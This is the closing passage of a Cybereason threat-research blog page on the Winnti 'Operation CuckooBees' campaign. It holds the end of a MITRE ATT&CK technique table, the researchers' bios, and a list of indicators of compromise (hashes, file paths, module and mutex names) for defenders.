<td style="border: 1pt solid #000000; height: 80px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1201/">Password Policy Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 80px;">
<td style="border: 1pt solid #000000; height: 80px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1069/">Permission Groups Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 80px;">
<td style="border: 1pt solid #000000; height: 80px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1135/">Network Share Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 80px;">
<td style="border: 1pt solid #000000; height: 80px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1007/">System Service Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 80px;">
<td style="border: 1pt solid #000000; height: 80px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1124/">System Time Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 80px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 80px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 109.333px;">
<td style="border: 1pt solid #000000; height: 109px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1049/">System Network Connections Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 109px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 50.6667px;">
<td style="border: 1pt solid #000000; height: 51px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1087/">Account Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 51px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 109.333px;">
<td style="border: 1pt solid #000000; height: 109px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1033/">System Owner/User Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 109px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 109.333px;">
<td style="border: 1pt solid #000000; height: 109px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1082/">System Information Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 109px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 109px; width: 146px;">&nbsp;</td>
</tr>
<tr style="height: 50.6667px;">
<td style="border: 1pt solid #000000; height: 51px; width: 121.021px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 157.5px;">
<p><span style="font-size: 14px;"><a href="https://attack.mitre.org/techniques/T1057/">Process Discovery</a></span></p>
</td>
<td style="border: 1pt solid #000000; height: 51px; width: 151.333px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 144.479px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 124.646px;">&nbsp;</td>
<td style="border: 1pt solid #000000; height: 51px; width: 146px;">&nbsp;</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2 style="font-size: 30px;">About the Researchers:</h2>
<p><strong><img src="https://www.cybereason.com/hs-fs/hubfs/Chen%20Erlich.png?width=196&amp;name=Chen%20Erlich.png" alt="Chen Erlich" width="196" loading="lazy" style="width: 196px; float: left; margin: 0px 7px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Chen%20Erlich.png?width=98&amp;name=Chen%20Erlich.png 98w, https://www.cybereason.com/hs-fs/hubfs/Chen%20Erlich.png?width=196&amp;name=Chen%20Erlich.png 196w, https://www.cybereason.com/hs-fs/hubfs/Chen%20Erlich.png?width=294&amp;name=Chen%20Erlich.png 294w, https://www.cybereason.com/hs-fs/hubfs/Chen%20Erlich.png?width=392&amp;name=Chen%20Erlich.png 392w, https://www.cybereason.com/hs-fs/hubfs/Chen%20Erlich.png?width=490&amp;name=Chen%20Erlich.png 490w, https://www.cybereason.com/hs-fs/hubfs/Chen%20Erlich.png?width=588&amp;name=Chen%20Erlich.png 588w" sizes="(max-width: 196px) 100vw, 196px">Chen Erlich</strong></p>
<p>Chen has almost a decade of experience in Threat Intelligence &amp; Research, Incident Response and Threat Hunting. Before joining Cybereason, Chen spent three years dissecting APTs, investigating underground cybercriminal groups and discovering security vulnerabilities in known vendors. Previously, he served as a Security Researcher in the <span style="color: #33475b;"><span style="background-color: #ffff64;">military forces</span></span>.</p>
<p>&nbsp;</p>
<p style="font-weight: bold;"><img src="https://www.cybereason.com/hs-fs/hubfs/profile-pics.png?width=194&amp;name=profile-pics.png" alt="profile-pics" width="194" loading="lazy" style="width: 194px; float: left; margin: 0px 7px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/profile-pics.png?width=97&amp;name=profile-pics.png 97w, https://www.cybereason.com/hs-fs/hubfs/profile-pics.png?width=194&amp;name=profile-pics.png 194w, https://www.cybereason.com/hs-fs/hubfs/profile-pics.png?width=291&amp;name=profile-pics.png 291w, https://www.cybereason.com/hs-fs/hubfs/profile-pics.png?width=388&amp;name=profile-pics.png 388w, https://www.cybereason.com/hs-fs/hubfs/profile-pics.png?width=485&amp;name=profile-pics.png 485w, https://www.cybereason.com/hs-fs/hubfs/profile-pics.png?width=582&amp;name=profile-pics.png 582w" sizes="(max-width: 194px) 100vw, 194px">Fusao Tanida</p>
<p><span>Fusao spent over 10 years in the security industry. Before joining, he worked as a mobile malware researcher and a developer at the security vendor and then worked at the global mobile phone manufacturer for the development of AntiVirus, VPN client on their Android mobile phone.</span><br><span>Fusao joined Cybereason in 2019 and was previously the Senior Security Analyst at the Advanced Services Team in Cybereason Japan where delivered various security professional services, Incident Response, consultation and triage malware activity alerts in SOC.</span></p>
<p style="font-weight: bold;"><img src="https://www.cybereason.com/hs-fs/hubfs/Ofir%20Ozer.png?width=194&amp;name=Ofir%20Ozer.png" alt="Ofir Ozer" width="194" loading="lazy" style="width: 194px; float: left; margin: 0px 7px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Ofir%20Ozer.png?width=97&amp;name=Ofir%20Ozer.png 97w, https://www.cybereason.com/hs-fs/hubfs/Ofir%20Ozer.png?width=194&amp;name=Ofir%20Ozer.png 194w, https://www.cybereason.com/hs-fs/hubfs/Ofir%20Ozer.png?width=291&amp;name=Ofir%20Ozer.png 291w, https://www.cybereason.com/hs-fs/hubfs/Ofir%20Ozer.png?width=388&amp;name=Ofir%20Ozer.png 388w, https://www.cybereason.com/hs-fs/hubfs/Ofir%20Ozer.png?width=485&amp;name=Ofir%20Ozer.png 485w, https://www.cybereason.com/hs-fs/hubfs/Ofir%20Ozer.png?width=582&amp;name=Ofir%20Ozer.png 582w" sizes="(max-width: 194px) 100vw, 194px">Ofir Ozer</p>
<p>Ofir is a Incident Response Engineer at Cybereason who has a keen interest in Windows Internals, reverse engineering, memory analysis and network anomalies. He has years of experience in Cyber Security, focusing on Malware Research, Incident Response and Threat Hunting. Ofir started his career as a Security Researcher in the <span style="color: #33475b;"><span style="background-color: #faa52d;">military forces</span></span>&nbsp;and then became a malware researcher focusing on Banking Trojans.</p>
<p style="font-weight: bold;"><img src="https://www.cybereason.com/hs-fs/hubfs/Akihiro.png?width=191&amp;name=Akihiro.png" alt="Akihiro" width="191" loading="lazy" style="width: 191px; float: left; margin: 0px 7px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Akihiro.png?width=96&amp;name=Akihiro.png 96w, https://www.cybereason.com/hs-fs/hubfs/Akihiro.png?width=191&amp;name=Akihiro.png 191w, https://www.cybereason.com/hs-fs/hubfs/Akihiro.png?width=287&amp;name=Akihiro.png 287w, https://www.cybereason.com/hs-fs/hubfs/Akihiro.png?width=382&amp;name=Akihiro.png 382w, https://www.cybereason.com/hs-fs/hubfs/Akihiro.png?width=478&amp;name=Akihiro.png 478w, https://www.cybereason.com/hs-fs/hubfs/Akihiro.png?width=573&amp;name=Akihiro.png 573w" sizes="(max-width: 191px) 100vw, 191px">Akihiro Tomita</p>
<p>Akihiro is the Senior Manager of Global Security Practice, leading Incident Response team in the APAC region and Japan. Akihiro has led a substantial number of large-scale Incident Response, Digital Forensics and Compromise Assessment engagements during recent years. Akihiro was also a former Team lead of Advanced Security Services team responsible for managing, developing, delivering a variety of professional services including Proactive threat hunting, Security Posture Assessment, Advanced security training and consulting services at Cybereason.</p>
<p style="font-weight: bold;"><img src="https://www.cybereason.com/hs-fs/hubfs/Niv%20Yona.png?width=195&amp;name=Niv%20Yona.png" alt="Niv Yona" width="195" loading="lazy" style="width: 195px; float: left; margin: 0px 7px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/Niv%20Yona.png?width=98&amp;name=Niv%20Yona.png 98w, https://www.cybereason.com/hs-fs/hubfs/Niv%20Yona.png?width=195&amp;name=Niv%20Yona.png 195w, https://www.cybereason.com/hs-fs/hubfs/Niv%20Yona.png?width=293&amp;name=Niv%20Yona.png 293w, https://www.cybereason.com/hs-fs/hubfs/Niv%20Yona.png?width=390&amp;name=Niv%20Yona.png 390w, https://www.cybereason.com/hs-fs/hubfs/Niv%20Yona.png?width=488&amp;name=Niv%20Yona.png 488w, https://www.cybereason.com/hs-fs/hubfs/Niv%20Yona.png?width=585&amp;name=Niv%20Yona.png 585w" sizes="(max-width: 195px) 100vw, 195px">Niv Yona</p>
<p>Niv, IR Practice Director, leads Cybereason's incident response practice in the EMEA region. Niv began his career a decade ago in the Israeli Air Force as a team leader in the security operations center, where he specialized in incident response, forensics, and malware analysis. In former roles at Cybereason, he focused on threat research that directly enhances product detections and the Cybereason threat hunting playbook, as well as the development of new strategic services and offerings.</p>
<p style="font-weight: bold;"><img src="https://www.cybereason.com/hs-fs/hubfs/DANIEL%20FRANK.png?width=192&amp;name=DANIEL%20FRANK.png" alt="DANIEL FRANK" width="192" loading="lazy" style="width: 192px; float: left; margin: 0px 7px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/DANIEL%20FRANK.png?width=96&amp;name=DANIEL%20FRANK.png 96w, https://www.cybereason.com/hs-fs/hubfs/DANIEL%20FRANK.png?width=192&amp;name=DANIEL%20FRANK.png 192w, https://www.cybereason.com/hs-fs/hubfs/DANIEL%20FRANK.png?width=288&amp;name=DANIEL%20FRANK.png 288w, https://www.cybereason.com/hs-fs/hubfs/DANIEL%20FRANK.png?width=384&amp;name=DANIEL%20FRANK.png 384w, https://www.cybereason.com/hs-fs/hubfs/DANIEL%20FRANK.png?width=480&amp;name=DANIEL%20FRANK.png 480w, https://www.cybereason.com/hs-fs/hubfs/DANIEL%20FRANK.png?width=576&amp;name=DANIEL%20FRANK.png 576w" sizes="(max-width: 192px) 100vw, 192px">Daniel Frank</p>
<p><span>With a decade in malware research, Daniel uses his expertise with malware analysis and reverse engineering to understand APT activity and commodity cybercrime attackers. Daniel has previously shared research at RSA Conference, the Microsoft Digital Crimes Consortium, and Rootcon.</span></p>
<p>&nbsp;</p>
<p style="font-weight: bold;"><img src="https://www.cybereason.com/hs-fs/hubfs/assaf%20dahan.png?width=193&amp;name=assaf%20dahan.png" alt="assaf dahan" width="193" loading="lazy" style="width: 193px; float: left; margin: 0px 7px 0px 0px;" srcset="https://www.cybereason.com/hs-fs/hubfs/assaf%20dahan.png?width=97&amp;name=assaf%20dahan.png 97w, https://www.cybereason.com/hs-fs/hubfs/assaf%20dahan.png?width=193&amp;name=assaf%20dahan.png 193w, https://www.cybereason.com/hs-fs/hubfs/assaf%20dahan.png?width=290&amp;name=assaf%20dahan.png 290w, https://www.cybereason.com/hs-fs/hubfs/assaf%20dahan.png?width=386&amp;name=assaf%20dahan.png 386w, https://www.cybereason.com/hs-fs/hubfs/assaf%20dahan.png?width=483&amp;name=assaf%20dahan.png 483w, https://www.cybereason.com/hs-fs/hubfs/assaf%20dahan.png?width=579&amp;name=assaf%20dahan.png 579w" sizes="(max-width: 193px) 100vw, 193px">ASSAF DAHAN, HEAD OF THREAT RESEARCH<br><br><span style="font-weight: normal;">Assaf has over 15 years in the InfoSec industry. He started his career in the military forces&nbsp;Cybersecurity unit where he developed extensive experience in offensive security. Later in his career he led Red Teams, developed penetration testing methodologies, and specialized in malware analysis and reverse engineering.</span></p></span>
          
          <!-- IOC PopUp Modal -->
          
          
            <div id="hs_cos_wrapper_module_162281712252340" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><!-- Button -->



<div class="cr-modal" id="iocs">
  <div class="cr-modal-overlay cr-modal-toggle"></div>
  <div class="cr-modal-wrapper cr-modal-transition">
    <div class="cr-modal-header">
      <button class="cr-modal-close cr-modal-toggle" id="ioc-close">X</button>
    </div>

    <div class="cr-modal-body">
      <div class="cr-modal-content">
        <h3 style="line-height: 1.5; font-size: 20px;"><strong data-stringify-type="bold">Operation CuckooBees </strong><strong data-stringify-type="bold">Indicators of Compromise (IOCs)</strong></h3>
<p style="font-size: 16px; line-height: 1.5;"><strong data-stringify-type="bold">Hashes</strong></p>
<ul style="font-size: 12px; line-height: 1.5;">
<li aria-level="1">BB93AE0FEE817FE56C31BDC997F3F7D57A48C187 - STASHLOG</li>
<li aria-level="1">4D1B8791D0715FE316B43FC95BDC335CB31A82CA - STASHLOG</li>
<li aria-level="1">2D336978AF261E07B1ECFAF65DC903B239E287A4 - STASHLOG</li>
<li aria-level="1">F2D04FE529E2D8DAB96242305255CFB84CE81E9C - STASHLOG</li>
<li aria-level="1">F8D46895E738254238473D650D99BDC92C34EE44 - SPARKLOG</li>
<li aria-level="1">9267FE0BB6D367FC9186E89EA65B13BAA7418D87 - PRIVATELOG</li>
<li aria-level="1">A009A0F5A385683AEA74299CBE6D5429C609F2D2 - PRIVATELOG</li>
<li aria-level="1">1316F715D228AE6CC1FBA913C6CC309861F82E14 - PRIVATELOG</li>
<li aria-level="1">1275894D8231FE25DB56598DDCF869F88DF5AD8D - WINNKIT</li>
<li aria-level="1">9139C89B2B625E2CEEE2CBF72AEF6C5104707A26 - WINNKIT</li>
<li aria-level="1">082DBCA2C3CA5C5410DE9951A5C681F0C42235C8 - WINNKIT</li>
</ul>
<p style="font-size: 16px; line-height: 1.5;"><strong>File Names &amp; Paths</strong></p>
<ul style="font-size: 12px; line-height: 1.5;">
<li aria-level="1">C:\Windows\temp\bc.bat</li>
<li aria-level="1">C:\Windows\AppPatch\Custom\Custom64\cc.bat</li>
<li aria-level="1">C:\Windows\temp\cc.log</li>
<li aria-level="1">C:\Windows\AppPatch\Custom\Custom64\log.dat</li>
<li aria-level="1">C:\Windows\Branding\Basebrd\x64.tlb</li>
<li aria-level="1">C:\Windows\Branding\Basebrd\language.dll</li>
<li aria-level="1">C:\Windows\System32\mscuplt.dll</li>
<li aria-level="1">C:\Windows\System32\rpcutl.dll</li>
<li aria-level="1">C:\Windows\System32\dot3utl.dll</li>
<li aria-level="1">C:\Windows\System32\iumatl.dll</li>
<li aria-level="1">C:\Windows\System32\Nlsutl.dll</li>
<li aria-level="1">C:\Windows\System32\WindowsPowerShell\v1.0\dbghelp.dll</li>
<li aria-level="1">C:\Windows\System32\drivers\bqDsp.sys</li>
<li aria-level="1">C:\Windows\apppatch\en-us\MFSDLL.exe</li>
<li aria-level="1">C:\Windows\System32\spool\drivers\x64\3\prntvpt.dll</li>
<li aria-level="1">C:\Windows\System32\WindowsPowerShell\v1.0\wlbsctrl.dll</li>
<li aria-level="1">C:\Windows\assembly\gac_msil\dfsvc\foserv.exe</li>
<li aria-level="1">C:\Windows\assembly\temp\foserv.exe</li>
<li aria-level="1">C:\Windows\apppatch\custom\custom64\shiver.exe</li>
<li aria-level="1">C:\Windows\apppatch\custom\custom64\spark.exe</li>
<li aria-level="1">mktzx64.dll</li>
</ul>
<p style="font-size: 16px; line-height: 1.5;"><strong>Winnti Malware Modules Names</strong></p>
<ul style="font-size: 12px; line-height: 1.5;">
<li aria-level="1">Cmp2.o</li>
<li aria-level="1">Fmg2.o</li>
<li aria-level="1">Srv2.o</li>
<li aria-level="1">Sck2.o</li>
<li aria-level="1">Prc2.o</li>
<li aria-level="1">Trs2.o</li>
<li aria-level="1">Cme2.o</li>
</ul>
<p style="font-size: 16px; line-height: 1.5;"><strong>Events</strong></p>
<ul style="font-size: 12px; line-height: 1.5;">
<li aria-level="1">\BaseNamedObjects\{75F09225-CD50-460B-BF90-5743B8404D73}</li>
<li aria-level="1">\BaseNamedObjects\{7D0DF5FC-3991-4047-921F-32308B1A0459}</li>
<li aria-level="1">\BaseNamedObjects\{B73AB0F4-A1D0-4406-9066-41E00BA78E9F}</li>
<li aria-level="1">Global\APCI#&lt;GUID&gt;</li>
<li aria-level="1">Global\HVID_&lt;GUID&gt;</li>
</ul>
<p style="font-size: 16px; line-height: 1.5;"><strong>Named Pipes</strong></p>
<ul style="font-size: 12px; line-height: 1.5;">
<li aria-level="1">Pipe2PortCtrl</li>
</ul>
<p style="font-size: 16px; line-height: 1.5;"><strong>Scheduled Task Name</strong></p>
<ul style="font-size: 12px;">
<li style="line-height: 1.5;" aria-level="1">test</li>
</ul>
      </div>
    </div>
  </div>
</div></div>
          
          
          <!-- -->
          
          <!-- Social Share -->
          <div class="cr-blog-post__social-sharing">
            <span>Share</span>
            <div id="hs_cos_wrapper_module_161724375084957" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module widget-type-social_sharing" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">






<div class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_social_sharing" data-hs-cos-general-type="widget" data-hs-cos-type="social_sharing">
  
	
  
    
    
    
			
		

    <a href="https://twitter.com/intent/tweet?original_referer=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=twitter&amp;url=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=twitter&amp;source=tweetbutton&amp;text=" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/twitter-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on twitter">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.facebook.com/share.php?u=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=facebook" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/facebook-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on facebook">
    </a>
	

  
	
  
    
    
    
			
		

    <a href="http://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques&amp;utm_medium=social&amp;utm_source=linkedin" target="_blank" rel="noopener" style="width:16px;">
      <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/linkedin-gray.svg" class="hs-image-widget hs-image-social-sharing-24" style="height:16px;width:16px;" width="16" hspace="0" alt="Share on linkedin">
    </a>
	

</div></div>
          </div> 
          
          
          <!-- CONDITIONAL Author Box Display -->
            <div class="container columns cr-mln__author-listing-single">
              
                <div class="column headshot is-3-full-hd is-3-desktop is-3-tablet is-12-mobile">
                  <img class="cr-speaker-headshot" src="https://www.cybereason.com/hubfs/CR_Owl_Web_Mono@3x%202.png" alt="Cybereason Nocturnus">
                </div>
              
              <div class="column is-9-full-hd is-9-desktop is-12-mobile">
                <span class="descriptor">About the Author</span>
                <h4>Cybereason Nocturnus</h4>
                
                  <a class="social" href="https://www.linkedin.com/company/cybereason" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-linkedin.png">
                  </a>
                
                
                  <a class="social" href="https://twitter.com/cr_nocturnus" target="_blank">
                    <img src="https://www.cybereason.com/hubfs/dam/images/images-web/blog-images/template-images/icon-social-gray-twitter.svg">
                  </a>
                
                
                  <p>The Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.</p>
                
                
                  <a class="cr-button cr-button__min" href="https://www.cybereason.com/blog/authors/cybereason-nocturnus">All Posts by Cybereason Nocturnus</a>
                
              </div>            
            </div>
          
        <!-- CONDITIONAL Post Type Choices -->
        
        <!-- Malicious Life Post -->
        
        
        <!-- CISO Stories -->
        
        <!-- Webinar -->
        
          
        <!-- CONDITIONAL Transcript -->
          
        
         <!-- Related Posts -->
        <div id="hs_cos_wrapper_module_1649342860525315" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive"><img src="https://www.cybereason.com/hubfs/blog-post-text%20%2888%29.png" alt="Operation CuckooBees: A Winnti Malware Arsenal Deep-Dive"></a>
    <h4><a href="https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive"><span class="underline">Operation CuckooBees: A Winnti Malware Arsenal Deep-Dive</span></a></h4>
     <p>This research zeroes in on the Winnti malware arsenal and includes analysis of the observed malware and the complex Winnti infection chain, including evasive maneuvers and stealth techniques that are baked-in to the malware code...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/threat-alert-proxynotshell-two-critical-vulnerabilities-affecting-ms-exchange"><img src="https://www.cybereason.com/hubfs/blog-post-text%20-%202022-10-03T113003.246.png" alt="THREAT ALERT: ProxyNotShell - Two Critical Vulnerabilities Affecting MS Exchange"></a>
    <h4><a href="https://www.cybereason.com/blog/threat-alert-proxynotshell-two-critical-vulnerabilities-affecting-ms-exchange"><span class="underline">THREAT ALERT: ProxyNotShell - Two Critical Vulnerabilities Affecting MS Exchange</span></a></h4>
     <p>The Cybereason GSOC Managed Detection and Response (MDR) Team is investigating incidents that involve exploitation of the critical Microsoft Exchange vulnerabilities (CVE-2022–41040 and CVE-2022–41082) dubbed ProxyNotShell after finding them being exploited in the wild...</p>
   </div>
 </div>



    </div>
  </div>
</section></div>
          
          
      </div>
        
        <!-- Sidebar -->

      <div class="column is-3-fullhd is-3-desktop is-12-mobile cr-malicious-life-network__sidebar">
        <div class="cr-ml-sidebar--group">
        <div class="top-stripe"></div>
        <div class="sidebar-block search-section">
          <form action="/hs-search-results">
            <input type="search" class="hs-search-field__input" name="term" autocomplete="on" placeholder="Search">
            <input type="hidden" name="type" value="BLOG_POST">
            <input type="hidden" name="type" value="LISTING_PAGE">
            <button type="submit" class="arrow"></button>
          </form>
        </div>
        <div class="sidebar-block subscribe">
          <a href="#blog-subscribe">
            <h4>Subscribe</h4>
            <span>Never miss a blog.</span>
          </a>
        </div>

        <div class="sidebar-block recent-posts">
          <h4>Recent Posts</h4>
          
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/chrome-extension-campaign-madgicx" class="post-name"><span class="underline">Behind the Mask of Madgicx Plus: A Chrome Extension Campaign Targeting Meta Advertisers</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/two-sharepoint-on-prem-vulnerabilities" class="post-name"><span class="underline">CVE-2025-53770 &amp; CVE-2025-53771: Critical&nbsp;On-Prem SharePoint Vulnerabilities</span></a>
                       
                    </div>
                </div>
            
                <div class="recent-posts__single-post">
                    <div class="text-content-bundle">
                        <a href="https://www.cybereason.com/blog/blacksuit-data-exfil" class="post-name"><span class="underline">BlackSuit: A Hybrid Approach with Data Exfiltration and Encryption</span></a>
                       
                    </div>
                </div>
            
        </div>

        <div class="sidebar-block category-listing">
          <h4>Categories</h4>
          <ul>
            <li><a href="https://www.cybereason.com/blog/category/research">Research</a></li>
            <li><a href="https://www.cybereason.com/blog/category/podcasts">Podcasts</a></li>
            <li><a href="https://www.cybereason.com/blog/category/webinars">Webinars</a></li>
            <li><a href="https://www.cybereason.com/blog/category/resources">Resources</a></li>
            <li><a href="https://www.cybereason.com/blog/category/videos">Videos</a></li>
            <li><a href="https://www.cybereason.com/blog/category/news">News</a></li>
          </ul>

          <a class="rec-category__single--view-all" href="/blog/category/research">All Posts</a>
        </div>

        
      </div><!-- END .rec-categories__all -->
      
      
      
    </div>
       
    </div>
  </div>
</div></div>

</div><!--end row-->
</div><!--end row-wrapper -->

<div class="row-fluid-wrapper row-depth-1 row-number-2 ">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget " style="display: none;" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_module_1616011887658867" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
<section class="cr-section related-posts__wrapper">
  <div class="container container-is-blog page-center">
     <h3>Related Posts</h3>
     <div class="columns is-multiline">
       
  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
    <a href="https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive"><img src="https://www.cybereason.com/hubfs/blog-post-text%20%2888%29.png" alt="Operation CuckooBees: A Winnti Malware Arsenal Deep-Dive"></a>
    <h4><a href="https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive"><span class="underline">Operation CuckooBees: A Winnti Malware Arsenal Deep-Dive</span></a></h4>
     <p>This research zeroes in on the Winnti malware arsenal and includes analysis of the observed malware and the complex Winnti infection chain, including evasive maneuvers and stealth techniques that are baked-in to the malware code...</p>
   </div>
 </div>


  
 <div class="column is-6-fullhd is-6-desktop is-full-mobile blog-listing__single-post">
  <div class="text-content-bundle">
